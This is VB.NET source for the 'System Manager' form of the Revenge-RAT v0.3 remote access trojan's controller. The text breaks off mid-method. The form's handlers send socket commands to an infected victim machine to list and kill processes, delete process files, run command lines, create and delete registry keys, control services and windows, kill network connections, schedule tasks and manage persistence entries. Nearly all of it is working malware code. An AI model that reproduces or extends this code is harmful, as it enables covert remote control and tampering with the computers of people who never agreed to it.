Imports Microsoft.VisualBasic.CompilerServices
Imports System.Runtime.CompilerServices
Imports System.Text
Imports Revenge_RAT_v0._3.RevengeRAT
Imports Revenge_RAT_v0._3.Main

Public Class System_Manager
    Public CloseWait As Integer
    Public Established As Integer
    Public Listen As Integer
    Private m_SortingColumn As ColumnHeader
    Public N As Integer
    Public sock As Integer
    Public Time_Wait As Integer
    Public Sub New()
        Me.N = 0
        Me.Established = 0
        Me.CloseWait = 0
        Me.Listen = 0
        Me.Time_Wait = 0
        Me.InitializeComponent()
    End Sub

    Private Sub AW_ColumnClick(sender As Object, e As ColumnClickEventArgs) Handles AW.ColumnClick
        Dim ascending As SortOrder
        Dim header As ColumnHeader = DirectCast(NewLateBinding.LateGet(sender, Nothing, "Columns", New Object() {e.Column}, Nothing, Nothing, Nothing), ColumnHeader)
        If (Me.m_SortingColumn Is Nothing) Then
            ascending = SortOrder.Ascending
        ElseIf header.Equals(Me.m_SortingColumn) Then
            If Operators.ConditionalCompareObjectEqual(Me.m_SortingColumn.Tag, "+", False) Then
                ascending = SortOrder.Descending
            Else
                ascending = SortOrder.Ascending
            End If
        Else
            ascending = SortOrder.Ascending
        End If
        Me.m_SortingColumn = header
        If (ascending = SortOrder.Ascending) Then
            Me.m_SortingColumn.Tag = "+"
        Else
            Me.m_SortingColumn.Tag = "-"
        End If
        If (Not sender Is Nothing) Then
            NewLateBinding.LateSet(sender, Nothing, "ListViewItemSorter", New Object() {New clsListviewSorter(e.Column, ascending)}, Nothing, Nothing)
            NewLateBinding.LateCall(sender, Nothing, "Sort", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
            NewLateBinding.LateSet(sender, Nothing, "ListViewItemSorter", New Object() {Nothing}, Nothing, Nothing)
        End If
    End Sub

    Private Sub BinaryToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BinaryToolStripMenuItem.Click
        Me.C(3, True)
    End Sub

    Private Sub Commands_KeyDown(sender As Object, e As KeyEventArgs) Handles Commands.KeyDown
        If (e.KeyCode = Keys.Enter) Then
            Dim commands As TextBox = Me.Commands
            Dim text As String = commands.Text
            commands.Text = [text]
            My.Forms.Main.s.Send(Me.sock, ("WirteLines" & My.Forms.Main.Key & System_Manager.ENB([text])))
            Me.Commands.Clear()
        End If
    End Sub

    Private Sub CreateKeyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CreateKeyToolStripMenuItem.Click
        If (Me.KeysName.SelectedItems.Count > 0) Then
            Dim flagArray As Boolean()
            Dim str As String = Interaction.InputBox("Key Name?!", "Create New Key", "New", -1, -1)
            Dim input As String = String.Empty
            Me.ToolStripStatusLabel7.Text = "Please wait a moment ..."
            If (Me.KeysName.FocusedItem.SubItems.Item(0).Text = "...") Then
                input = (Me.RegPath.Text.Replace(Conversions.ToString(Operators.ConcatenateObject(Me.RegValues.SelectedItem, "\")), "") & "\" & str)
                Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("Create Sub Key" & My.Forms.Main.Key), SocketServer.Encode(Conversions.ToString(Me.RegValues.SelectedItem))), My.Forms.Main.Key), SocketServer.Encode(input))}
                flagArray = New Boolean() {True, False}
                NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, flagArray, True)
                If flagArray(0) Then
                    Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                End If
            Else
                input = (Me.RegPath.Text.Replace(Conversions.ToString(Operators.ConcatenateObject(Me.RegValues.SelectedItem, "\")), "") & Me.KeysName.FocusedItem.SubItems.Item(0).Text & "\" & str)
                Dim objArray As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("Create Sub Key" & My.Forms.Main.Key), SocketServer.Encode(Conversions.ToString(Me.RegValues.SelectedItem))), My.Forms.Main.Key), SocketServer.Encode(input))}
                flagArray = New Boolean() {True, False}
                NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", objArray, Nothing, Nothing, flagArray, True)
                If flagArray(0) Then
                    Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(Integer)))
                End If
            End If
        End If
    End Sub

    Private Sub CTP_Click(sender As Object, e As EventArgs) Handles CTP.Click
        Dim ct As New CT
        ct.Sock = Me.sock
        ct.Text = Me.Text.Replace("System Manager", "Create Task")
        ct.ShowDialog()
    End Sub

    Private Sub DeleteSelectedToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteSelectedToolStripMenuItem.Click
        If (Me.KeysName.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator
            Me.ToolStripStatusLabel7.Text = "Please wait a moment ..."
            Try
                enumerator = Me.KeysName.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Dim input As String = String.Empty
                    input = (Me.RegPath.Text.Replace(Conversions.ToString(Operators.ConcatenateObject(Me.RegValues.SelectedItem, "\")), "") & current.SubItems.Item(0).Text)
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("Delete Sub Key" & My.Forms.Main.Key), SocketServer.Encode(Conversions.ToString(Me.RegValues.SelectedItem))), My.Forms.Main.Key), SocketServer.Encode(input))}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                Loop
            Finally
            End Try
        End If
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteToolStripMenuItem.Click
        If (Me.ValuesRegName.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = Me.ValuesRegName.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Dim input As String = String.Empty
                    input = Me.RegPath.Text.Replace(Conversions.ToString(Operators.ConcatenateObject(Me.RegValues.SelectedItem, "\")), "")
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("Delete Value" & My.Forms.Main.Key), SocketServer.Encode(Conversions.ToString(Me.RegValues.SelectedItem))), My.Forms.Main.Key), SocketServer.Encode(input)), My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(0).Text))}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                Loop
            Finally
            End Try
        End If
    End Sub

    Private Sub DWORDToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DWORDToolStripMenuItem.Click
        Me.C(4, True)
    End Sub

    Private Sub ExpandStringToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExpandStringToolStripMenuItem.Click
        Me.C(2, True)
    End Sub

    Private Sub GCPU_ToggleChanged(sender As Object, e As EventArgs) Handles GCPU.ToggleChanged
        If Me.GCPU.Toggle Then
            My.Forms.Main.s.Send(Me.sock, "RCPU")
        Else
            Me.CpuGraph1.Enabled = False
            Me.Label60.Enabled = False
            Me.Panel9.Enabled = False
            Me.Label58.Text = "N/A"
            Me.Label56.Text = "N/A"
            Me.Label55.Text = "N/A"
            Me.Label49.Text = "N/A"
            Me.Label53.Text = "N/A"
            Me.Label44.Text = "N/A"
            Me.Label25.Text = "N/A"
            Me.Label47.Text = "N/A"
            Me.Label41.Text = "N/A"
            Me.Label45.Text = "N/A"
            Me.Label52.Text = "N/A"
            If (Me.TabControl1.TabPages.Item(1).Text <> "CPU ( Null )") Then
                Me.TabControl1.TabPages.Item(1).Text = "CPU ( Null )"
                Me.Label60.Text = "CPU"
            End If
        End If
    End Sub

    Private Sub GSUS_ToggleChanged(sender As Object, e As EventArgs) Handles GSUS.ToggleChanged
        If Me.GSUS.Toggle Then
            My.Forms.Main.s.Send(Me.sock, "SDUN")
        Else
            Me.TabControl1.TabPages.Item(2).Text = "Sound Device ( Null )"
            Me.Label79.Text = "Sound Device"
            Me.Label79.Enabled = False
            Me.AudioGraph1.Enabled = False
        End If
    End Sub

    Private Sub HideToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HideToolStripMenuItem.Click
        If (Me.AW.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator
            Me.ToolStripStatusLabel3.Text = "Please wait a moment ..."
            Try
                enumerator = Me.AW.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("Hide" & My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(1).Text))}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub KeysName_DoubleClick(sender As Object, e As EventArgs) Handles KeysName.DoubleClick
        If (Me.KeysName.FocusedItem.SubItems.Item(0).Text = "...") Then
            Me.RegPath.Text = Me.RegPath.Text.Substring(0, Me.RegPath.Text.LastIndexOf("\"))
            Me.RegPath.Text = Me.RegPath.Text.Substring(0, (Me.RegPath.Text.LastIndexOf("\") + 1))
            Me.ReReg(True)
        Else
            Me.ReReg(False)
        End If
        Me.ToolStripStatusLabel7.Text = "Please wait a moment ..."
        Me.KeysName.Enabled = False
        Me.RegValues.Enabled = False
        Me.ValuesRegName.Enabled = False
        Me.Panel3.Enabled = False
    End Sub

    Private Sub KillDeleteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KillDeleteToolStripMenuItem.Click
        If (Me.Processlists.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator
            Me.ToolStripStatusLabel4.Text = "Please wait a moment ..."
            Try
                enumerator = Me.Processlists.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("Kill+Delete" & My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(1).Text)), My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(3).Text))}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub KillProcessToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles KillProcessToolStripMenuItem1.Click
        If (Me.TCPC.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = Me.TCPC.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("KillTCPProcess" & My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(1).Text))}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                    Me.ToolStripStatusLabel6.Text = "Please wait a moment ..."
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub KillProcessToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KillProcessToolStripMenuItem.Click
        If (Me.Processlists.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator
            Me.ToolStripStatusLabel4.Text = "Please wait a moment ..."
            Try
                enumerator = Me.Processlists.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("KillProcess" & My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(1).Text))}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub LockXButtonToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LockXButtonToolStripMenuItem.Click
        If (Me.AW.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator
            Me.ToolStripStatusLabel3.Text = "Please wait a moment ..."
            Try
                enumerator = Me.AW.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("Lock" & My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(1).Text))}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub MaximzeToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MaximzeToolStripMenuItem.Click
        If (Me.AW.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator
            Me.ToolStripStatusLabel3.Text = "Please wait a moment ..."
            Try
                enumerator = Me.AW.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("Maximize" & My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(1).Text))}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub MinimizeToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MinimizeToolStripMenuItem.Click
        If (Me.AW.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator
            Me.ToolStripStatusLabel3.Text = "Please wait a moment ..."
            Try
                enumerator = Me.AW.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("minimize" & My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(1).Text))}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                Loop
            Finally
            End Try
        End If
    End Sub

    Private Sub MultiStringToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MultiStringToolStripMenuItem.Click
        Me.C(7, True)
    End Sub

    Private Sub PauseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PauseToolStripMenuItem.Click
        If (Me.SM.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator
            Me.ToolStripStatusLabel5.Text = "Please wait a moment ..."
            Try
                enumerator = Me.SM.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("Pause" & My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(2).Text))}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                Loop
            Finally
            End Try
        End If
    End Sub

    Private Sub Processlists_ColumnClick(sender As Object, e As ColumnClickEventArgs) Handles Processlists.ColumnClick
        Dim ascending As SortOrder
        Dim header As ColumnHeader = DirectCast(NewLateBinding.LateGet(sender, Nothing, "Columns", New Object() {e.Column}, Nothing, Nothing, Nothing), ColumnHeader)
        If (Me.m_SortingColumn Is Nothing) Then
            ascending = SortOrder.Ascending
        ElseIf header.Equals(Me.m_SortingColumn) Then
            If Operators.ConditionalCompareObjectEqual(Me.m_SortingColumn.Tag, "+", False) Then
                ascending = SortOrder.Descending
            Else
                ascending = SortOrder.Ascending
            End If
        Else
            ascending = SortOrder.Ascending
        End If
        Me.m_SortingColumn = header
        If (ascending = SortOrder.Ascending) Then
            Me.m_SortingColumn.Tag = "+"
        Else
            Me.m_SortingColumn.Tag = "-"
        End If
        If (Not sender Is Nothing) Then
            NewLateBinding.LateSet(sender, Nothing, "ListViewItemSorter", New Object() {New clsListviewSorter(e.Column, ascending)}, Nothing, Nothing)
            NewLateBinding.LateCall(sender, Nothing, "Sort", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
            NewLateBinding.LateSet(sender, Nothing, "ListViewItemSorter", New Object() {Nothing}, Nothing, Nothing)
        End If
    End Sub

    Private Sub Processlists_DoubleClick(sender As Object, e As EventArgs) Handles Processlists.DoubleClick
        If (Me.Processlists.SelectedItems.Count > 0) Then
            Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("Process Properties" & My.Forms.Main.Key), SocketServer.Encode(Me.Processlists.SelectedItems.Item(0).SubItems.Item(3).Text)), My.Forms.Main.Key), Me.Processlists.SelectedItems.Item(0).SubItems.Item(1).Text)}
            Dim copyBack As Boolean() = New Boolean() {True, False}
            NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
            If copyBack(0) Then
                Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
            End If
            Me.ToolStripStatusLabel1.Text = "Please wait a moment ..."
        End If
    End Sub

    Private Sub PropertiesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PropertiesToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Processlists.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If (Me.Processlists.SelectedItems.Count > 0) Then
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("Process Properties" & My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(3).Text)), My.Forms.Main.Key), current.SubItems.Item(1).Text)}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                    Me.ToolStripStatusLabel1.Text = "Please wait a moment ..."
                End If
            Loop
        Finally
        End Try
    End Sub

    Private Sub QWORDToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles QWORDToolStripMenuItem.Click
        Me.C(11, True)
    End Sub

    Private Sub RefreshAW_Click(sender As Object, e As EventArgs) Handles RefreshAW.Click
        Me.AW.Items.Clear()
        Me.AW.Enabled = False
        My.Forms.Main.s.Send(Me.sock, "ActivteWidnwos")
        Me.ToolStripStatusLabel3.Text = "Please wait a moment ..."
    End Sub

    Private Sub RefreshServiceToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshServiceToolStripMenuItem.Click
        If (Me.SM.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator
            Me.ToolStripStatusLabel5.Text = "Please wait a moment ..."
            Try
                enumerator = Me.SM.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("Refresh" & My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(2).Text))}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
                    NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                    End If
                Loop
            Finally
            End Try
        End If
    End Sub

    Private Sub RefreshSM_Click(sender As Object, e As EventArgs) Handles RefreshSM.Click
        Me.SM.Items.Clear()
        Me.SM.Enabled = False
        My.Forms.Main.s.Send(Me.sock, ("GetService" & My.Forms.Main.Key))
        Me.ToolStripStatusLabel5.Text = "Please wait a moment ..."
        Me.ToolStripStatusLabel5.Text = ""
    End Sub

    Private Sub RefreshToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem1.Click
        Me.TCPC.Items.Clear()
        Me.TCPC.Enabled = False
        Me.Established = 0
        Me.CloseWait = 0
        Me.Listen = 0
        Me.Time_Wait = 0
        My.Forms.Main.s.Send(Me.sock, "Get Connections")
        Me.ToolStripStatusLabel6.Text = "Please wait a moment ..."
    End Sub

    Private Sub RefreshToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem2.Click
        Dim input As String = String.Empty
        input = Me.RegPath.Text.Replace(Conversions.ToString(Operators.ConcatenateObject(Me.RegValues.SelectedItem, "\")), "")
        Me.KeysName.Items.Clear()
        Me.ValuesRegName.Items.Clear()
        Me.ToolStripStatusLabel7.Text = "Please wait a moment ..."
        Me.KeysName.Enabled = False
        Me.RegValues.Enabled = False
        Me.ValuesRegName.Enabled = False
        Me.Panel3.Enabled = False
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.RegPath.Text, Operators.ConcatenateObject(Me.RegValues.SelectedItem, "\"), False))) Then
            Me.KeysName.Items.Add("...", 0)
        End If
        Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("Enter To Sub Key" & My.Forms.Main.Key), SocketServer.Encode(Conversions.ToString(Me.RegValues.SelectedItem))), My.Forms.Main.Key), SocketServer.Encode(input))}
        Dim copyBack As Boolean() = New Boolean() {True, False}
        NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
        If copyBack(0) Then
            Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
        End If
    End Sub

    Private Sub RefreshToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem3.Click
        Dim input As String = String.Empty
        input = Me.RegPath.Text.Replace(Conversions.ToString(Operators.ConcatenateObject(Me.RegValues.SelectedItem, "\")), "")
        Me.ValuesRegName.Enabled = False
        Me.ValuesRegName.Items.Clear()
        Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("RefreshValues" & My.Forms.Main.Key), SocketServer.Encode(Conversions.ToString(Me.RegValues.SelectedItem))), My.Forms.Main.Key), SocketServer.Encode(input))}
        Dim copyBack As Boolean() = New Boolean() {True, False}
        NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
        If copyBack(0) Then
            Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
        End If
        Me.ToolStripStatusLabel7.Text = "Please wait a moment ..."
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        Me.Processlists.Items.Clear()
        Me.Processlists.Enabled = False
        My.Forms.Main.s.Send(Me.sock, "GetProcesses")
        Me.ToolStripStatusLabel1.Text = "Please wait a moment ..."
        Me.ToolStripStatusLabel2.Text = ""
        Me.ToolStripStatusLabel4.Text = ""
    End Sub

    Private Sub RegValues_SelectedIndexChanged(sender As Object, e As EventArgs) Handles RegValues.SelectedIndexChanged
        Me.KeysName.Items.Clear()
        Me.ValuesRegName.Items.Clear()
        Me.ToolStripStatusLabel7.Text = "Please wait a moment ..."
        Me.KeysName.Enabled = False
        Me.RegValues.Enabled = False
        Me.Panel3.Enabled = False
        Me.ValuesRegName.Enabled = False
        Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("Get Sub Keys Names" & My.Forms.Main.Key), SocketServer.Encode(Conversions.ToString(Me.RegValues.SelectedItem)))}
        Dim copyBack As Boolean() = New Boolean() {True, False}
        NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
        If copyBack(0) Then
            Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
        End If
    End Sub

    Private Sub RemvoeToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemvoeToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.PIIT.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(("Delete PI" & My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(0).Text))}
                Dim copyBack As Boolean() = New Boolean() {True, False}
                NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                If copyBack(0) Then
                    Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                End If
            Loop
        Finally
        End Try
    End Sub

    Private Sub RenameToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RenameToolStripMenuItem.Click
        If (Me.AW.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator
            Dim input As String = Interaction.InputBox("Select a new name to Windows!", "Select Select a new name!", "Revenge-RAT", -1, -1)
            Try
                enumerator = Me.AW.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    If (input <> Nothing) Then
                        Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("RenameWindows" & My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(1).Text)), My.Forms.Main.Key), SocketServer.Encode(input))}
                        Dim copyBack As Boolean() = New Boolean() {True, False}
                        NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                        If copyBack(0) Then
                            Me.sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                        End If
                    End If
                Loop
            Finally
            End Try
            If (input <> Nothing) Then
                Me.ToolStripStatusLabel3.Text = "Please wait a moment ..."
            End If
        End If
    End Sub

    Private Sub RestartProcessToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartProcessToolStripMenuItem.Click
        If (Me.Processlists.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator
            Me.ToolStripStatusLabel4.Text = "Please wait a moment ..."
            Try
                enumerator = Me.Processlists.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Dim arguments As Object() = New Object() {Me.sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("RestProcess" & My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(1).Text)), My.Forms.Main.Key), SocketServer.Encode(current.SubItems.Item(3).Text))}
                    Dim copyBack As Boolean() = New Boolean() {True, False}
